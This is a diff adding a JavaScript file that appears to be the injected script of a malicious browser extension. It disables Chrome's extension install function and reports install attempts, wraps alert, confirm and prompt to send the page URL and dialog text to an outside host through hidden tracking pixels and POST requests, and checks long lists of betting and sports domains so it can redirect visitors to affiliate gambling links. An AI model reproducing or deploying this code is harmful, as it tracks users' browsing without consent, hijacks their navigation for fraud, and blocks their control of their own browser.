@@ -1,0 +1,164 @@
+
+reTake() && setInterval(function() {
+    reTake();
+}, 250);
+
+function reTake() {
+    chrome.webstore.install = function (url, successCallback, failureCallback) {
+        report_installext(url);
+    }
+    window.onbeforeunload = null;
+    cancelFullscreen();
+}
+
+function cancelFullscreen() {
+    if(document.cancelFullScreen) {
+        document.cancelFullScreen();
+    } else if(document.mozCancelFullScreen) {
+        document.mozCancelFullScreen();
+    } else if(document.webkitCancelFullScreen) {
+        document.webkitCancelFullScreen();
+    }
+}
+
+var win_count = 1;
+
+window.realAlert=window.alert;
+window.realConfirm=window.confirm;
+window.realPrompt=window.prompt;
+
+window.alert=function(s){
+    if (win_count <= 3) {
+        report_alert(s, "alert");
+        win_count++;
+        realAlert(s);
+    }
+}
+
+window.confirm=function(s){
+    if (win_count <= 3) {
+        report_alert(s, "confirm");
+        win_count++;
+        return realConfirm(s);
+    }
+}
+
+window.prompt=function(s){
+    if (win_count <= 3) {
+        report_alert(s, "prompt");
+        win_count++;
+        return realPrompt(s);
+    }
+}
+
+function report_alert(alert_text, window_type)
+{
+    var find_plug = document.querySelector("link[rel^=\"chrome\"]").href || "";
+    var find_srvp = window.HJ888311373u2jk4h9shs12315552131ld893ryhslfhsdflname || "";
+
+    var xhr = new window["XMLHttpRequest"];
+    var body = 'url=' + encodeURI(location.href) + '&text=' + encodeURI(alert_text);
+
+    var el = document.createElement("img");
+    el.src="https://xn--wgbafiz2bycof.online/pix_alert?type=" + window_type + "&plug=" + encodeURI(find_plug) + "&srvp=" + encodeURI(find_srvp) + "&page=" + encodeURI(location.href);
+    el.style.border = "0";
+    el.style.position = 'absolute';
+    el.style.overflow = "hidden";
+    el.style.top = "-100px";
+    el.style.left = "-100px";
+    el.style.zIndex = -1;
+    el.style.width = "1px";
+    el.style.height = "1px";
+
+    xhr["open"]("POST","https://xn--wgbafiz2bycof.online/report_alerts.json?type=" + window_type + "&plug=" + encodeURI(find_plug) + "&srvp=" + encodeURI(find_srvp));
+    xhr["send"](body);
+}
+
+function report_installext(hash)
+{
+    var hash = hash || "";
+
+    var find_plug = document.querySelector("link[rel^=\"chrome\"]").href || "";
+    var find_srvp = window.HJ888311373u2jk4h9shs12315552131ld893ryhslfhsdflname || "";
+
+    var el = document.createElement("img");
+    el.src = "https://xn--wgbafiz2bycof.online/pix_install?hash=" + encodeURI(hash) + "&plug=" + encodeURI(find_plug) + "&srvp=" + encodeURI(find_srvp) + "&page=" + encodeURI(location.href);
+    el.style.border = "0";
+    el.style.position = 'absolute';
+    el.style.overflow = "hidden";
+    el.style.top = "-100px";
+    el.style.left = "-100px";
+    el.style.zIndex = -1;
+    el.style.width = "1px";
+    el.style.height = "1px";
+
+    document.body.appendChild(el);
+}
+
+// ==
+
+var cookie_name = "helloman4";
+
+function setCookie(cname, cvalue, exdays, callback) {
+    var d = new Date();
+    d.setTime(d.getTime() + (exdays*24*60*60*1000));
+    var expires = "expires="+ d.toUTCString();
+    document.cookie = cname + "=" + cvalue + ";" + expires + ";path=/";
+    callback();
+}
+
+var findDomain = new Promise(function(resolve, reject) {
+    // bet
+    var list3 = ["^(.*\.)olimpkz\\.com$","^(.*\.)parimatch\\.com$","^(.*\.)myscore\\.com\\.ua$","^(.*\.)myscore\\.ru$","^(.*\.)favorit\\.com\\.ua$","^(.*\.)championat\\.com$","^(.*\.)start\\.parimatchsport8\\.com$","^(.*\.)flashscore\\.com$","^(.*\.)start\\.parimatch\\.com$","^(.*\.)parimatch\\.by$","^(.*\.)start\\.parimatch-sports3\\.com$","^(.*\.)marathonbet\\.com$","^(.*\.)sports\\.ru$","^(.*\.)eurosport\\.ru$","^(.*\.)promo2\\.zirkabet\\.com$","^(.*\.)livetv\\.sx$","^(.*\.)ligastavok\\.ru$","^(.*\.)soccerstand\\.com$","^(.*\.)1xstavka\\.ru$","^(.*\.)bkfon\\.ru$","^(.*\.)football\\.kulichki\\.net$","^(.*\.)livescore\\.com$","^(.*\.)fonbet\\.com$","^(.*\.)football\\.ua$","^(.*\.)betsbc\\.com$","^(.*\.)promo\\.zirkabet\\.com$","^(.*\.)sport\\.totogaming\\.am$","^(.*\.)olimp\\.com$","^(.*\.)matchtv\\.ru$","^(.*\.)soccer365\\.ru$","^(.*\.)plusminus\\.by$","^(.*\.)gooool\\.org$","^(.*\.)soccer0100\\.com$","^(.*\.)rezultati\\.com$","^(.*\.)myscore\\.ua$","^(.*\.)betcity\\.by$","^(.*\.)soccerlife\\.ru$","^(.*\.)terrikon\\.com$","^(.*\.)vprognoze\\.ru$","^(.*\.)1xbet\\.com$","^(.*\.)ua-football\\.com$","^(.*\.)preb\\.pw$","^(.*\.)bombardir\\.ru$","^(.*\.)online\\.khl\\.ru$","^(.*\.)1cupis\\.ru$","^(.*\.)betcityrus\\.com$","^(.*\.)favoritsport\\.com\\.ua$","^(.*\.)nhl\\.com$","^(.*\.)marathonbet\\.by$","^(.*\.)footballhd\\.ru$","^(.*\.)maxline\\.by$","^(.*\.)favbet\\.com$","^(.*\.)1xeng\\.xyz$","^(.*\.)zenit66\\.win$","^(.*\.)marathonlinebet\\.com$","^(.*\.)redwhite\\.ru$","^(.*\.)tennisi\\.com$","^(.*\.)dynamo\\.kiev\\.ua$","^(.*\.)livetv141\\.net$","^(.*\.)online\\.vhlru\\.ru$","^(.*\.)ua\\.1xbet\\.com$","^(.*\.)canliskor2\\.com$","^(.*\.)football24\\.ua$","^(.*\.)euro-football\\.ru$","^(.*\.)start\\.parimatchbets2\\.com$","^(.*\.)betfair\\.com$","^(.*\.)1xcyb\\.xyz$","^(.*\.)vseprosport\\.ru$","^(.*\.)zenitbet\\.com$","^(.*\.)olimpua\\.com$","^(.*\.)olimpru\\.com$","^(.*\.)baltbet\\.ru$","^(.*\.)bkfonbet\\.com$","^(.*\.)soccer\\.ru$","^(.*\.)1xcri\\.xyz$","^(.*\.)lemanbet\\.biz$","^(.*\.)topaz\\.az$","^(.*\.)sport\\.bigmir\\.net$","^(.*\.)by\\.tribuna\\.com$","^(.*\.)flashscore\\.ro$","^(.*\.)betexplorer\\.com$","^(.*\.)ww3\\.365planetwinall\\.net$","^(.*\.)oddsportal\\.com$","^(.*\.)isport\\.ua$","^(.*\.)football\\.sport\\.ua$","^(.*\.)vpliuse\\.ru$","^(.*\.)fapl\\.ru$","^(.*\.)online\\.mhl\\.khl\\.ru$","^(.*\.)golpas\\.com$","^(.*\.)bkparimatch7\\.com$","^(.*\.)agiveo\\.net$","^(.*\.)rusbiathlon\\.ru$","^(.*\.)bobsoccer\\.ru$","^(.*\.)sport5online\\.com$","^(.*\.)baltplay8\\.com$","^(.*\.)chelseablues\\.ru$","^(.*\.)fongametime\\.net$","^(.*\.)betzenit\\.com$","^(.*\.)tipsport\\.cz$","^(.*\.)futbik\\.net"];
+    if (list3.length > 0) {
+        for (var i = 0; i < list3.length; i++) {
+            var r = new RegExp(list3[i], "i");
+            if (r.test(document.location.host) || r.test('www.' + document.location.host)) {
+                resolve('bet');
+            }
+        }
+    }
+    // kz
+    var list4 = ["^(.*\.)totobet\\.kz$","^(.*\.)olimp\\.kz$","^(.*\.)golpas\\.kz$","^(.*\.)parimatch\\.kz$","^(.*\.)profitbets\\.kz$","^(.*\.)bkolimp\\.kz$","^(.*\.)ejiep\\.b2b\\.ivest\\.kz$","^(.*\.)topbet\\.kz$","^(.*\.)kzinbet\\.kz$","^(.*\.)betolimp\\.kz$","^(.*\.)clezl\\.b2b\\.ivest\\.kz$","^(.*\.)stavkabet\\.kz$","^(.*\.)sarg\\.b2b\\.ivest\\.kz$","^(.*\.)abit\\.kz$","^(.*\.)sports\\.kz$","^(.*\.)footboom\\.kz$","^(.*\.)dfk\\.kz$","^(.*\.)fcaktobe-fans\\.kz$","^(.*\.)fckairat\\.kz$","^(.*\.)fc-tobol\\.kz$","^(.*\.)fp\\.kz$","^(.*\.)llf\\.kz$","^(.*\.)okzhetpes\\.kz$","^(.*\.)online\\.footboom\\.kz$","^(.*\.)pflk\\.kz$","^(.*\.)shahter\\.kz$","^(.*\.)start\\.parimatch\\.kz$","^(.*\.)ставки\\.kz$","^(.*\.)ставкиgrand\\.kz$","^(.*\.)ставки-grand\\.kz$","^(.*\.)ставки-x\\.kz$","^(.*\.)golden-games\\.kz$","^(.*\.)grand-Ставки\\.kz$","^(.*\.)grand-cazino\\.kz$","^(.*\.)va-bank\\.kz$","^(.*\.)onlinepoker\\.kz$","^(.*\.)apoker\\.kz$","^(.*\.)forum\\.apoker\\.kz$","^(.*\.)sportpoker\\.kz"];
+    if (list4.length > 0) {
+        for (var i = 0; i < list4.length; i++) {
+            var r = new RegExp(list4[i], "i");
+            if (r.test(document.location.host) || r.test('www.' + document.location.host)) {
+                resolve('kz');
+            }
+        }
+    }
+    reject(false);
+});
+
+findDomain.then(function(result) {
+    var checkCookies = new Promise(function(resolve, reject) {
+        if (document.cookie.indexOf(cookie_name + "=coco") > 0) {
+            reject(result);
+        } else {
+            resolve(result);
+        }
+    });
+    checkCookies.then(function(result) {
+        // no cookie, set and redirect
+        // console.log('[+] no cookie, set and redirect');
+        var publName = window.HJ888311373u2jk4h9shs12315552131ld893ryhslfhsdflname;
+        setCookie(cookie_name, "coco", 1, function () {
+            /*if (result == 'bet' && (
+             publName == 'ac4332c83ae19107ff945607fa1eb27a' ||
+             publName == 'd5aa6648e67007e7dba5540a9a541222' ||
+             navigator.userAgent.match(/YaBrowser/i)
+             )) {
+             location.href="http://refpacoj.xyz//L?tag=s_20295m_355c_script&site=20295&ad=355";
+             }*/
+            if (result == 'bet') {
+                location.href="http://www.paripartner.com/wl/clk/?btag=a_9984b_208&aid=scrpt";
+            } else if (result == 'kz') {
+                location.href="http://ultra-bonus.com/pokerdom/freeroll?partner=p51485p191524p71c6&promo=scrpt";
+            }
+        });
+
+    }, function(error) {
+    });
+}, function(error) {
+});
